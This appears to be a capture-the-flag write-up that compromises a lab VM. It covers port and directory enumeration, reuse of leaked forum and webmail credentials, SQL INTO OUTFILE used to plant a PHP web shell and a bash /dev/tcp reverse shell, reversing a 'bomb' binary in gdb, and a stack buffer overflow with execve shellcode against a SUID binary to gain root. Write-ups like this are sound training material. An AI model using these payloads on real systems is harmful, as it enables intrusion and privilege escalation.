## Enumeration

### ping sweep

We found the ip address of our target using ping sweep

```
$ nmap -sn 192.168.0.0/24
...
Nmap scan report for 192.168.0.6
Host is up (0.00068s latency).
...
```

### nmap scan

After identifying the target ip, we scaned it for open ports

```
$ nmap -sV 192.168.0.6
...
21/tcp  open  ftp      vsftpd 2.0.8 or later
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
143/tcp open  imap     Dovecot imapd
443/tcp open  ssl/http Apache httpd 2.2.22
993/tcp open  ssl/imap Dovecot imapd
...
```

### port 80

http://192.168.0.6/ contains a static web page, nothing of interest.

### port 443

When using https, we got a 404 error, which means there is not default page.

We used `ffuf` to find hidden resources

```
$ ffuf -u https://192.168.0.6/FUZZ -w ~/wordlists/web/common.txt
...
forum                   [Status: 301, Size: 306, Words: 20, Lines: 10, Duration: 1ms]
phpmyadmin              [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 2ms]
webmail                 [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 1ms]
...
```

#### forum

We did the same thing for `/forum` to find more resources, but nothing of interest at the moment.

```
$ ffuf -u https://192.168.0.6/forum/FUZZ -w ~/wordlists/web/common.txt
...
modules                 [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 5ms]
templates_c             [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 0ms]
themes                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 1ms]
update                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 0ms]
...
```

We found what looks like a password at https://192.168.0.6/forum/index.php?id=6: `!q\]Ej?*5K5cy*AJ`

```
curl -sk https://192.168.0.6/forum/index.php?id=6 | egrep -o 'invalid user .* from' | cut -d ' ' -f 3 | sort -u
```
We also found a list of users at https://192.168.0.6/forum/index.php?mode=user

After trying the password with different users, we were able to login as lmezard: `lmezard:!q\]Ej?*5K5cy*AJ`

In the user's profile page (https://192.168.0.6/forum/index.php?mode=user&action=edit_profile),
we found an email address

#### webmail

We used the email found at the forum `laurie@borntosec.net` with the password we had `!q\]Ej?*5K5cy*AJ`
to login to the webmail portal.

In the email with the subject `DB Access`, there were credentials to access databases, we used them to
access phpmyadmin.

#### phpmyadmin

Logged in using this creds `root:Fg-'kKXBj87E:aJ$`. We were able to access the forum database and extract
password hashes but we were unable to crack any of them.

As we can execute sql queries by browsing to https://192.168.0.6/phpmyadmin/server_sql.php,
we tried creating a php script on the web server. But we had to find writable directories first.

We used the directories found after fuzzing `/forum`, and `templates_c` was writable.

As a proof of concept we used the following query to create `info.php`

```
SELECT '<?php phpinfo();?>' INTO OUTFILE '/var/www/forum/templates_c/info.php'
```

After browing to https://192.168.0.6/forum/templates_c/info.php, the php code was executed.

## Initial access

Now that we had a way to create php files on the web server, we created a script to get a reverse shell.

We executes the following query

```
SELECT '<?php system("bash -c \'bash -i >& /dev/tcp/192.168.0.5/9000 0>&1\'");?>' INTO OUTFILE '/var/www/forum/templates_c/shell.php'
```

After that, we started a listener to receive the connection

```
$ nc -lnp 9000
```

Then browsed to https://192.168.0.6/forum/templates_c/shell.php, and got a reverse shell as `www-data`.

We then used this commands to get a stable shell.

```
target$ python -c 'import pty; pty.spawn("/bin/bash")'
target$ Ctrl+Z
attack$ stty -a
speed 38400 baud; rows 53; columns 237; line = 0;
...
attack$ stty raw -echo; fg
target$ export TERM=xterm
target$ stty rows 53 columns 237
```

## Privilege escalation

### www-data -> lmezard

We found a file containing credentials for the user `lmezard` at `/home/LOOKATME`.

```
$ cat /home/LOOKATME/password
lmezard:G!@M6f4Eatau{sF"
```
### lmezard -> laurie

At lmezard's home directory there was a tar archive `fun`.

```
$ file fun
fun: POSIX tar archive (GNU)
```

We downloaded and extracted it on our machine.

```
$ ftp ftp://lmezard@192.168.0.6/fun
$ tar xf fun
```
The extracted folder `ft_fun` contained a lot of files with the extension `pcap`, one of these files contained the following `main()`.

```c
int main() {
        printf("M");
        printf("Y");
        printf(" ");
        printf("P");
        printf("A");
        printf("S");
        printf("S");
        printf("W");
        printf("O");
        printf("R");
        printf("D");
        printf(" ");
        printf("I");
        printf("S");
        printf(":");
        printf(" ");
        printf("%c",getme1());
        printf("%c",getme2());
        printf("%c",getme3());
        printf("%c",getme4());
        printf("%c",getme5());
        printf("%c",getme6());
        printf("%c",getme7());
        printf("%c",getme8());
        printf("%c",getme9());
        printf("%c",getme10());
        printf("%c",getme11());
        printf("%c",getme12());
        printf("\n");
        printf("Now SHA-256 it and submit");
}
```

To extract the password for `laurie` we had to reorder the files based on an index found at every file.
to do that, we created a script: extract_pass.sh

```
$ bash scripts/extract_pass.sh
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4  -
```

### laurie -> thor

After login in as laurie, we copied the `bomb` binary to our machine to reverse it.

```
$ scp laurie@192.168.0.6:bomb .
```
We execute it using gdb `gdb ./bomb`

After disassembling main(), we saw that we have to go throught 6 phases without `explode_bomb` being called.

```
gdb-peda$ disas main
   0x08048a5b <+171>:   call   0x8048b20 <phase_1>
   ...
   0x08048a7e <+206>:   call   0x8048b48 <phase_2>
   ...
   0x08048aa1 <+241>:   call   0x8048b98 <phase_3>
   ...
   0x08048ac4 <+276>:   call   0x8048ce0 <phase_4>
   ...
   0x08048ae7 <+311>:   call   0x8048d2c <phase_5>
   ...
   0x08048b0a <+346>:   call   0x8048d98 <phase_6>
```

1. phase_1

`strings_not_equal` is called with two arguments, our input which is stored stored at `eax` and a string stored at `0x80497c0`.

```
gdb-peda$ disas phase_1
   ...
   0x08048b2c <+12>:    push   0x80497c0
   0x08048b31 <+17>:    push   eax
=> 0x08048b32 <+18>:    call   0x8049030 <strings_not_equal>
   ...
```

When examining that address we found our first answer.

```
gdb-peda$ x/s 0x80497c0
0x80497c0:      "Public speaking is very easy."
```

2. phase_2

This phase expects our input to have 6 numbers.

```
$gdb-peda$ disas phase_2
    ...
    0x08048b5b <+19>:    call   0x8048fd8 <read_six_numbers>
    ...
```
Then it checks that the first number is 1, if not `explode_bomb` is called and the program exits.
```
0x08048b63 <+27>:    cmp    DWORD PTR [ebp-0x18],0x1
0x08048b67 <+31>:    je     0x8048b6e <phase_2+38>
0x08048b69 <+33>:    call   0x80494fc <explode_bomb>
```
After that it checks that each number `esi+ebx*4` equals the product of its index `ebx+0x1` and the previous number `esi+ebx*4-0x4`.

> Note: indexes start at 1

```
0x08048b6e <+38>:    mov    ebx,0x1
0x08048b73 <+43>:    lea    esi,[ebp-0x18]
0x08048b76 <+46>:    lea    eax,[ebx+0x1]
0x08048b79 <+49>:    imul   eax,DWORD PTR [esi+ebx*4-0x4]
0x08048b7e <+54>:    cmp    DWORD PTR [esi+ebx*4],eax
0x08048b81 <+57>:    je     0x8048b88 <phase_2+64>
0x08048b83 <+59>:    call   0x80494fc <explode_bomb>
0x08048b88 <+64>:    inc    ebx
0x08048b89 <+65>:    cmp    ebx,0x5
0x08048b8c <+68>:    jle    0x8048b76 <phase_2+46>
```
The combination that satisfy this rule is the following
```
1 2 6 24 120 720
```

3. phase_3

This phase expects more than 2 arguments, or `explode_bomb` is called.
```
$gdb-peda$ disas phase_3
    ...
    0x08048bb1 <+25>:    push   0x80497de
    ...
    0x08048bb7 <+31>:    call   0x8048860 <sscanf@plt>
    0x08048bbc <+36>:    add    esp,0x20
    0x08048bbf <+39>:    cmp    eax,0x2
    0x08048bc2 <+42>:    jg     0x8048bc9 <phase_3+49>
    0x08048bc4 <+44>:    call   0x80494fc <explode_bomb>
    ...
```
The expected input is `"int char int"` which can be seen in the format passed to `sscanf`.
```
gdb-peda$ x/s 0x80497de
0x80497de:      "%d %c %d"
```
The first int `ebp-0xc` controls the address to jump to, it has 8 possible values from 0 to 7.
```
0x08048bd3 <+59>:    mov    eax,DWORD PTR [ebp-0xc]
0x08048bd6 <+62>:    jmp    DWORD PTR [eax*4+0x80497e8]
```
ebp-0xc = 0: valid input would be "0 q 777"
```
gdb-peda$ x/3i *(0x80497e8+4*0)
    0x8048be0 <phase_3+72>:      mov    bl,0x71
    0x8048be2 <phase_3+74>:      cmp    DWORD PTR [ebp-0x4],0x309
    0x8048be9 <phase_3+81>:      je     0x8048c8f <phase_3+247>
    ...
```
ebp-0xc = 1: valid input would be "1 b 214"
```
gdb-peda$ x/3i *(0x80497e8+4*1)
   0x8048c00 <phase_3+104>:     mov    bl,0x62
   0x8048c02 <phase_3+106>:     cmp    DWORD PTR [ebp-0x4],0xd6
   0x8048c09 <phase_3+113>:     je     0x8048c8f <phase_3+247>
   ...
```
ebp-0xc = 2: valid input would be "2 b 755"
```
gdb-peda$ x/3i *(0x80497e8+4*2)
   0x8048c16 <phase_3+126>:     mov    bl,0x62
   0x8048c18 <phase_3+128>:     cmp    DWORD PTR [ebp-0x4],0x2f3
   0x8048c1f <phase_3+135>:     je     0x8048c8f <phase_3+247>
```
ebp-0xc = 3: valid input would be "3 k 251"
```
gdb-peda$ x/3i *(0x80497e8+4*3)
   0x8048c28 <phase_3+144>:     mov    bl,0x6b
   0x8048c2a <phase_3+146>:     cmp    DWORD PTR [ebp-0x4],0xfb
   0x8048c31 <phase_3+153>:     je     0x8048c8f <phase_3+247>
   ...
```
ebp-0xc = 4: valid input would be "4 o 160"
```
gdb-peda$ x/3i *(0x80497e8+4*4)
   0x8048c40 <phase_3+168>:     mov    bl,0x6f
   0x8048c42 <phase_3+170>:     cmp    DWORD PTR [ebp-0x4],0xa0
   0x8048c49 <phase_3+177>:     je     0x8048c8f <phase_3+247>
   ...
```
ebp-0xc = 5: valid input would be "5 t 458"
```
gdb-peda$ x/3i *(0x80497e8+4*5)
   0x8048c52 <phase_3+186>:     mov    bl,0x74
   0x8048c54 <phase_3+188>:     cmp    DWORD PTR [ebp-0x4],0x1ca
   0x8048c5b <phase_3+195>:     je     0x8048c8f <phase_3+247>
   ...
```
ebp-0xc = 6: valid input would be "6 v 780"
```
gdb-peda$ x/3i *(0x80497e8+4*6)
   0x8048c64 <phase_3+204>:     mov    bl,0x76
   0x8048c66 <phase_3+206>:     cmp    DWORD PTR [ebp-0x4],0x30c
   0x8048c6d <phase_3+213>:     je     0x8048c8f <phase_3+247>
   ...
```
ebp-0xc = 7: valid input would be "7 b 524"
```
gdb-peda$ x/3i *(0x80497e8+4*7)
   0x8048c76 <phase_3+222>:     mov    bl,0x62
   0x8048c78 <phase_3+224>:     cmp    DWORD PTR [ebp-0x4],0x20c
   0x8048c7f <phase_3+231>:     je     0x8048c8f <phase_3+247>
   ...
```
bl which hold a character is compared to out inputed character here
```
gdb-peda$ x/3i *phase_3+247
   0x8048c8f <phase_3+247>:     cmp    bl,BYTE PTR [ebp-0x5]
   0x8048c92 <phase_3+250>:     je     0x8048c99 <phase_3+257>
   0x8048c94 <phase_3+252>:     call   0x80494fc <explode_bomb>
   0x8048c99 <phase_3+257>:     mov    ebx,DWORD PTR [ebp-0x18]
   ...
```

4. phase_4

This phase takes one number greater that 0, and passes it to `func4`, the returned value is compared to 55.
```
gdb-peda$ disas phase_4
    ...
    0x08048cf6 <+22>:    call   0x8048860 <sscanf@plt>
    ...
    0x08048cfe <+30>:    cmp    eax,0x1
    0x08048d01 <+33>:    jne    0x8048d09 <phase_4+41>
    0x08048d03 <+35>:    cmp    DWORD PTR [ebp-0x4],0x0
    0x08048d07 <+39>:    jg     0x8048d0e <phase_4+46>
    ...
    0x08048d11 <+49>:    mov    eax,DWORD PTR [ebp-0x4]
    0x08048d14 <+52>:    push   eax
    0x08048d15 <+53>:    call   0x8048ca0 <func4>
    ...
    0x08048d1d <+61>:    cmp    eax,0x37
    ...
```

`func4` returns 1 if its argument `ebx` is less then or equal to 1.
```
    0x08048ca8 <+8>:     mov    ebx,DWORD PTR [ebp+0x8]
    0x08048cab <+11>:    cmp    ebx,0x1
    0x08048cae <+14>:    jle    0x8048cd0 <func4+48>
    ...
    0x08048cd0 <+48>:    mov    eax,0x1
    ...
    0x08048cdd <+61>:    ret
```
If it is greater than 1, then the function calls it self recursively with `ebx-0x1` then `ebx-0x2` as argument, and their return values are added together.
```
   0x08048cb3 <+19>:    lea    eax,[ebx-0x1]
   0x08048cb6 <+22>:    push   eax
   0x08048cb7 <+23>:    call   0x8048ca0 <func4>
   0x08048cbc <+28>:    mov    esi,eax
   ...
   0x08048cc1 <+33>:    lea    eax,[ebx-0x2]
   0x08048cc4 <+36>:    push   eax
   0x08048cc5 <+37>:    call   0x8048ca0 <func4>
   0x08048cca <+42>:    add    eax,esi

```
This function calculates the fibonacci number at the index passed as argument.

To get the index of the fibonacci number 55, we created `fibo_seq.py`, this script takes a number as argument and return its index at the fibonacci sequence.

After running the script with 55 as argument, we got the number `9`.

5. phase_5

This phase expects a string of 6 charachters.
```
gdb-peda$ disas phase_5
    0x08048d3b <+15>:    call   0x8049018 <string_length>
    0x08048d40 <+20>:    add    esp,0x10
    0x08048d43 <+23>:    cmp    eax,0x6
    0x08048d46 <+26>:    je     0x8048d4d <phase_5+33>
```
For each character `al` (al & 0xf) is used as index to get a character from `0x804b220`.
```
    0x08048d57 <+43>:    mov    al,BYTE PTR [edx+ebx*1]
    0x08048d5a <+46>:    and    al,0xf
    0x08048d5c <+48>:    movsx  eax,al
    0x08048d5f <+51>:    mov    al,BYTE PTR [eax+esi*1]
    0x08048d62 <+54>:    mov    BYTE PTR [edx+ecx*1],al
    0x08048d65 <+57>:    inc    edx
    0x08048d66 <+58>:    cmp    edx,0x5
    0x08048d69 <+61>:    jle    0x8048d57 <phase_5+43>
```
`0x804b220` contains the following string.
```
gdb-peda$ x/s 0x804b220
0x804b220:      "isrveawhobpnutfg\260\001"
```
After a string is generated, it compares it the string stored at `0x804980b`.
```
    0x08048d72 <+70>:    push   0x804980b
    0x08048d77 <+75>:    lea    eax,[ebp-0x8]
    0x08048d7a <+78>:    push   eax
    0x08048d7b <+79>:    call   0x8049030 <strings_not_equal>
```
The value stored in `0x804980b` is 'giants'.
```
gdb-peda$ x/s 0x804980b
0x804980b:      "giants"
```
To solve this phase we created phase_5.py, and we got 4 different solutions:

```
opekma
opekmq
opukma
opukmq
```

6. phase_6

This phase expects our input to have 6 numbers.
```
gdb-peda$ disas phase_6
    ...
    0x08048db3 <+27>:    call   0x8048fd8 <read_six_numbers>
    ...
```
For each number it checks that it is between 1 and 6.
```
   0x8048dc0 <phase_6+40>:      lea    eax,[ebp-0x18]
   0x8048dc3 <phase_6+43>:      mov    eax,DWORD PTR [eax+edi*4]
   0x8048dc6 <phase_6+46>:      dec    eax
   0x8048dc7 <phase_6+47>:      cmp    eax,0x5
   0x8048dca <phase_6+50>:      jbe    0x8048dd1 <phase_6+57>
```
And it also check that there are no duplicates.
```
   0x8048dd1 <phase_6+57>:      lea    ebx,[edi+0x1]
   0x8048dd4 <phase_6+60>:      cmp    ebx,0x5
   0x8048dd7 <phase_6+63>:      jg     0x8048dfc <phase_6+100>
   0x8048dd9 <phase_6+65>:      lea    eax,[edi*4+0x0]
   0x8048de0 <phase_6+72>:      mov    DWORD PTR [ebp-0x38],eax
   0x8048de3 <phase_6+75>:      lea    esi,[ebp-0x18]
   0x8048de6 <phase_6+78>:      mov    edx,DWORD PTR [ebp-0x38]
   0x8048de9 <phase_6+81>:      mov    eax,DWORD PTR [edx+esi*1]
   0x8048dec <phase_6+84>:      cmp    eax,DWORD PTR [esi+ebx*4]
   0x8048def <phase_6+87>:      jne    0x8048df6 <phase_6+94>
   0x8048df1 <phase_6+89>:      call   0x80494fc <explode_bomb>
   0x8048df6 <phase_6+94>:      inc    ebx
   0x8048df7 <phase_6+95>:      cmp    ebx,0x5
   0x8048dfa <phase_6+98>:      jle    0x8048de6 <phase_6+78>
   0x8048dfc <phase_6+100>:     inc    edi
   0x8048dfd <phase_6+101>:     cmp    edi,0x5
   0x8048e00 <phase_6+104>:     jle    0x8048dc0 <phase_6+40>
```
For the next part we needed to go back to a previous instrcution, which puts an address into `ebp-0x34`.
```
   0x08048da4 <+12>:    mov    DWORD PTR [ebp-0x34],0x804b26c
```
This address reprsents the head of a linked list. Each node of this linked list contains two integers
and the address of the next node.
```
gdb-peda$ x/3x 0x804b26c
0x804b26c <node1>:      0x000000fd      0x00000001      0x0804b260
gdb-peda$ x/3x 0x804b260
0x804b260 <node2>:      0x000002d5      0x00000002      0x0804b254
gdb-peda$ x/3x 0x804b254
0x804b254 <node3>:      0x0000012d      0x00000003      0x0804b248
gdb-peda$ x/3x 0x804b248
0x804b248 <node4>:      0x000003e5      0x00000004      0x0804b23c
gdb-peda$ x/3x 0x804b23c
0x804b23c <node5>:      0x000000d4      0x00000005      0x0804b230
gdb-peda$ x/3x 0x804b230
0x804b230 <node6>:      0x000001b0      0x00000006      0x00000000
```
Here the address is stored into `esi`, and each number of our input is used as index to get the appropriate node and append it to an array `edx`.
```
   0x08048e02 <+106>:   xor    edi,edi
   ...
   0x08048e10 <+120>:   mov    esi,DWORD PTR [ebp-0x34]
   0x08048e13 <+123>:   mov    ebx,0x1
   ...
   0x08048e21 <+137>:   cmp    ebx,DWORD PTR [eax+ecx*1]
   0x08048e24 <+140>:   jge    0x8048e38 <phase_6+160>
   ...
   0x08048e30 <+152>:   mov    esi,DWORD PTR [esi+0x8]
   0x08048e33 <+155>:   inc    ebx
   0x08048e34 <+156>:   cmp    ebx,eax
   0x08048e36 <+158>:   jl     0x8048e30 <phase_6+152>
   0x08048e38 <+160>:   mov    edx,DWORD PTR [ebp-0x3c]
   0x08048e3b <+163>:   mov    DWORD PTR [edx+edi*4],esi
   0x08048e3e <+166>:   inc    edi
   0x08048e3f <+167>:   cmp    edi,0x5
   0x08048e42 <+170>:   jle    0x8048e10 <phase_6+120>
```
For every node in the array `edx`, its next pointer is modified to point to the node after it.
```
   0x08048e4a <+178>:   mov    edi,0x1
   0x08048e4f <+183>:   lea    edx,[ebp-0x30]
   0x08048e52 <+186>:   mov    eax,DWORD PTR [edx+edi*4]
   0x08048e55 <+189>:   mov    DWORD PTR [esi+0x8],eax
   0x08048e58 <+192>:   mov    esi,eax
   0x08048e5a <+194>:   inc    edi
   0x08048e5b <+195>:   cmp    edi,0x5
   0x08048e5e <+198>:   jle    0x8048e52 <phase_6+186>
```
The last piece of code, check that the nodes are in a descending order, otherwise `explode_bomb` is called. 
```
   0x08048e70 <+216>:   mov    edx,DWORD PTR [esi+0x8]
   0x08048e73 <+219>:   mov    eax,DWORD PTR [esi]
   0x08048e75 <+221>:   cmp    eax,DWORD PTR [edx]
   0x08048e77 <+223>:   jge    0x8048e7e <phase_6+230>
   0x08048e79 <+225>:   call   0x80494fc <explode_bomb>
   0x08048e7e <+230>:   mov    esi,DWORD PTR [esi+0x8]
   0x08048e81 <+233>:   inc    edi
   0x08048e82 <+234>:   cmp    edi,0x4
   0x08048e85 <+237>:   jle    0x8048e70 <phase_6+216>
```
So, in order to solve this phase we used the following sequence:

```
4 2 6 3 1 5
```
### RECAP

phase_1
```
Public speaking is very easy.
```
phase_2
```
1 2 6 24 120 720
```
phase_3: only kept the solutions that contain the letter 'b' as it was hinted in 'README'
```
1 b 214
2 b 755
7 b 524
```
phase_4
```
9
```
phase_5
```
opekma
opekmq
opukma
opukmq
```
phase_6
```
4 2 6 3 1 5
```

Based on this results we have 12 password combination, and the correct one is the following.

```
Publicspeakingisveryeasy.126241207201b2149opekmq426135
```
### thor -> zaz

We created `turtle-solve.py` and used `turtle python library` with the instructions from the file 'turtle'.
After execution, we got a drawing of the word `SLASH`, but it was not the password.

The last line in the file says the following:
```
...
Can you digest the message? :)
```
This clue indicates that the password would be the `MD5` hash of the word 'SLASH', because `MD5` is an abriviation of `Message Digest 5`.

We calculated the `MD5` hash, and got the password for the user zaz.
```
$ echo -n SLASH | md5sum
646da671ca01bb5d84dbb5fb2238dc8e  -
```

### zaz -> root

`exploit_me` is being executed as `root` because it has `SUID` bit set. This binary takes an argument and print it to `STDOUT`.

```
$ ./exploit_me HELLO1337
HELLO1337
```

This code uses `strcpy()` to copy `argv[1]` into a buffer allocated on the stack.
```
(gdb) disas main
   ...
   0x0804840d <+25>:    mov    eax,DWORD PTR [ebp+0xc]
   0x08048410 <+28>:    add    eax,0x4
   0x08048413 <+31>:    mov    eax,DWORD PTR [eax]
   0x08048415 <+33>:    mov    DWORD PTR [esp+0x4],eax
   0x08048419 <+37>:    lea    eax,[esp+0x10]
   0x0804841d <+41>:    mov    DWORD PTR [esp],eax
   0x08048420 <+44>:    call   0x8048300 <strcpy@plt>
   ...
```
We were able to override the instruction pointer `eip` by the 4 bytes at the offset 140 of the argument.
```
(gdb) r $(python -c 'print("A"*140+"BBBB")')
...
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```
Next, we injected a shellcode to get a shell, but first we needed to find its address.

To do so. we sat a breakpoint before `ret` instruction, and examined the stack.
```
(gdb) b *main + 66
Breakpoint 2 at 0x8048436
(gdb) r $(python -c 'print("A"*117+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"+"BBBB")')
...
Breakpoint 2, 0x08048436 in main ()
(gdb) x/50x $esp
...
0xbffff680:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff690:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff6a0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff6b0:     0x41414141      0x50c03141      0x732f2f68      0x622f6868
0xbffff6c0:     0xe3896e69      0xe1895350      0x80cd0bb0      0x42424242
...
```
Our shellcode starts at the address `0xbffff6b5`.

Now that we have all we need, we created shellcode.py to generate the payload for us.

Once we ran the binary with our payload as argument we recieved a shell as the root user.
```
$ ./exploit_me $(python shellcode.py)
���������������������������������������������������������������������������������������������������������������������1�Ph//shh/bin��PS���
                    ����
# whoami
root
# 
```
